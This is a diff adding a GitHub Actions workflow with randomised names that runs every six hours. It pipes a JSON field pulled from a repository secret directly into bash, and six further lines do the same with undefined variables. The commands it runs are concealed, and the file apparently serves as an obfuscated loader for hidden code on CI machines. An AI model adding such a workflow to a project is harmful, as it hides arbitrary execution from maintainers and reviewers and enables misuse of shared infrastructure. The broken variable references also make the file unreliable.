@@ -1,0 +1,23 @@
+name: tuxiumc
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '57 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: tuxiumc
+        env:
+          wh76837: ${{ secrets.wh76837 }}
+        run: |
+          echo $wh76837 | jq -r .f207 | /bin/bash
+          echo $cf3256 | jq -r .z1 | /bin/bash
+          echo $ijl7187 | jq -r .ihrop3 | /bin/bash
+          echo $tlf247 | jq -r .amk013 | /bin/bash
+          echo $o558 | jq -r .ir25 | /bin/bash
+          echo $kgwym298 | jq -r .dyur8324 | /bin/bash
+          echo $fpei05931 | jq -r .r39 | /bin/bash
+
